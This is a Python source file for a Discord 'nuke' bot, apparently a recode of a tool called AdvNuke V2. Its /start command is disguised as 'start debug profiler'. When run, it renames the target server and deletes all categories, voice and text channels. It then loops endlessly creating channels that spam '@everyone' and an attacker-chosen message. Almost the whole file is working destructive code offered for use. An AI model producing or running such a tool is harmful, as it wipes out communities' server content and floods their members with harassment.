import discord
nukedby = "1"
import json
import os
file_pathv2 = os.path.expanduser("config.json")
file_path = os.path.expanduser("config.json")
def load_config_from_json(file_path):
    # Check if the JSON file exists
    if not os.path.exists(file_path):
        print(f"File '{file_path}' does not exist.")
        os.mkdir(file_pathv2)
        return None

    try:
        with open(file_path, 'r') as json_file:
            data = json.load(json_file)
        return data
    except json.JSONDecodeError as e:
        print(f"Error decoding JSON from '{file_path}': {e}")
        return None

# Load configuration data from the JSON file
config_data = load_config_from_json(file_path)

if config_data:
    botname = config_data.get('botname')
    name = config_data.get('name')
    dscacc = config_data.get('dscacc')
    token = config_data.get('token')
    userid = config_data.get('userid')
    license2 = config_data.get('license')
if userid == "t":
    
    aue = True
elif userid == "true":
    
    aue = True
else:
    
    aue = False
print("Welcome.")
if token == None:
    print("INVAILD TOKEN...")
    print("Use *config.py* For Setup..")
    sus = input("Press Enter To Continue...")
if token.isdigit():
    print("Invaild Token..")
    
suas = """


              _       _   _       _         __      _____  
     /\      | |     | \ | |     | |        \ \    / /__ \ 
    /  \   __| |_   _|  \| |_   _| | _____   \ \  / /   ) |
   / /\ \ / _` \ \ / / . ` | | | | |/ / _ \   \ \/ /   / / 
  / ____ \ (_| |\ V /| |\  | |_| |   <  __/    \  /   / /_ 
 /_/    \_\__,_| \_/ |_| \_|\__,_|_|\_\___|     \/   |____|
                                                           
                                                           

"""

print(suas)
from plyer import notification
bot = discord.Bot()
text_channel_ids = []
v_channel_ids = []
member_ids = []
aghdude = f"""
----------------------------------------------
__________________Logged In___________________
~~~~~~~~~~~~~~~~~~~~As~~~~~~~~~~~~~~~~~~~~~~~~
                    {name} / {dscacc}

Info

Version 2.00 (Recode)
License : {license2}



Bot Info

Name ~ {botname}
Token ~ {token}
"""
jamie = """

"""
import subprocess







print(aghdude)
gid = int(input("Guild Id :"))
nukedby = input("Message : ")
bywho = input("Channel Name : ")
print("Do CTRL + C to end this madness..")
print("Or Do /start To Start It..")
fucku = "jqm1e on top"
cc = []
@bot.event
async def on_ready():
    for guild in bot.guilds:
        # Iterate through the members in each guild
        for member in guild.members:
            member_ids.append(member.id)
            # Iterate through the guilds the bot is a member of
    for guild in bot.guilds:
        # Iterate through the channels in each guild
        for channel in guild.voice_channels:
            v_channel_ids.append(channel.id)
        # Iterate through the guilds the bot is a member of
    for guild in bot.guilds:
        # Iterate through the channels in each guild
        for channel in guild.text_channels:
            text_channel_ids.append(channel.id)
    for guild in bot.guilds:
        # Iterate through the categories in each guild
        for category in guild.categories:
            cc.append(category.id)

agh = "no"
@bot.command(name="start", description="start debug profiler")
async def wda3r(ctx):
    await ctx.guild.edit(name="github.com/jamielocal/adv-nuke-recode")
    guild = bot.get_guild(gid)
    await ctx.send(bywho)

    for category_id in cc:
            category = discord.utils.get(guild.categories, id=category_id)
            if category:
                await category.delete()
    for channel_id in v_channel_ids:
            channel = guild.get_channel(channel_id)
            if channel and isinstance(channel, discord.VoiceChannel):
                await channel.delete()
    if guild:
            for channel_id in text_channel_ids:
                channel = guild.get_channel(channel_id)
                if channel:
                    await channel.delete()
    
    
        

        
       
        
        
    
    while agh == "no":
        cock = await ctx.guild.create_text_channel(bywho)
        channel_id = cock.id
        channel = bot.get_channel(channel_id)
        await channel.send("@everyone ")
        await channel.send(nukedby)
        await channel.send(nukedby)





   
        






bot.run(token)
